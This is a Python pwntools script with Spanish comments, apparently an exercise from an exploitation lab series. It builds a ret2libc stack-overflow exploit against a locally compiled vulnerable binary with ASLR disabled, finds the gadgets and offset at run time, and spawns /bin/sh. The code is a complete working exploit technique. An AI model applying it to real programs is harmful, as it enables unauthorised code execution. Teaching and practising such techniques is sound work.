#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""B2 - ret2libc con ASLR desactivada: shell real con system("/bin/sh").
La base de libc se LEE con ldd (ASLR fuera = base fija), no se adivina.
Los gadgets 'pop rdi; ret' y 'ret' se buscan dinamicamente en libc y en
el binario con ROP() de pwntools. Nada hardcodeado.
USO: python3 b2_ret2libc.py"""
from pwn import *
import os
import re
import subprocess
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './b2_ret2libc'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'b2_ret2libc.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# ------------------------------------------------------------------
# FASE 0 - base de libc via ldd con ASLR fuera (setarch -R)
# setarch -R ldd ./b2_ret2libc  ->  libc.so.6 => ... (0x00007ffff7xxxxxx)
# ------------------------------------------------------------------
ARCH = os.uname().machine          # x86_64 en tu Kali
ldd_out = subprocess.run(
    ['setarch', ARCH, '-R', 'ldd', BIN],
    capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x([0-9a-f]+)\)', ldd_out)
if not m:
    log.failure('ldd no mostro libc; verifica setarch -R y ASLR.')
    raise SystemExit(1)
libc_path = m.group(1)
libc_base = int(m.group(2), 16)
log.info('libc: %s | base fija %#x (ASLR fuera)', libc_path, libc_base)

# TODAS las piezas salen de libc EN TIEMPO DE EJECUCION:
libc = ELF(libc_path, checksec=False)
libc.address = libc_base            # reubica TODOS los simbolos de golpe
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info('pop rdi; ret = %#x (libc)', pop_rdi)
log.info('system       = %#x (libc)', system)
log.info('"/bin/sh"    = %#x (libc)', binsh)

# gadget 'ret' suelto del PROPIO binario: alineacion de pila (ver B1)
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # misma via que ldd
io.recvuntil(b'pero libc si')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer desde $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - exploit: padding + [pop_rdi, binsh, ret, system]
#   pop rdi -> rdi = &"/bin/sh" (convencion System V: 1er arg en RDI)
#   ret     -> re-alinea la pila para system (movaps)
#   system  -> ejecuta /bin/sh heredando stdin/stdout del proceso
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # ASLR fuera, como el ldd
io.recvuntil(b'pero libc si')
payload = (b'A' * offset
           + p64(pop_rdi)
           + p64(binsh)
           + p64(ret_gadget)
           + p64(system))
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)                # gets() copia la linea completa
time.sleep(0.5)                     # dejar que system() arme el shell
io.sendline(b'echo PWNED_B2_$(id -u); id; exit')   # prueba de vida
salida = io.recvall(timeout=4)
io.close()

if b'PWNED_B2' in salida:
    log.success('B2 SUPERADO: ret2libc ejecuto system("/bin/sh").')
    log.info('NX sigue activo: no inyectaste codigo, reutilizaste libc.')
else:
    log.failure('B2: sin shell. Pistas: setarch -R en ldd Y en el proceso, '
                'gadget de alineacion y setvbuf(stdin) en el .c.')
